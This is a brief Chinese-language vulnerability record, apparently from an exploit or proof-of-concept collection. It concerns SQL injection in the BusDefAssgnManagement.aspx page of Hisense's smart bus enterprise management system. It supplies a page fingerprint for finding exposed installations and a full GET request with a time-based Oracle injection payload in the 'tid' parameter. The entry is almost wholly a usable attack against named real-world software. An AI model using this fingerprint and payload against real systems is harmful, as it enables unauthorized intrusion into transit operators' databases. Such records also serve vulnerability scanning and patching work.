# 海信智能公交企业管理系统BusDefAssgnManagement.aspx存在SQL注入漏洞

海信智能公交企业管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="var _FactoryData"`
- **请求**：`GET /YZSoft/Forms/XForm/BM/MaintainceManagement/BusDefAssgnManagement.aspx?tid=1+AND+3536=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)CHR(101)CHR(88)CHR(83),5)--+c HTTP/1.1`
- **响应特征**：200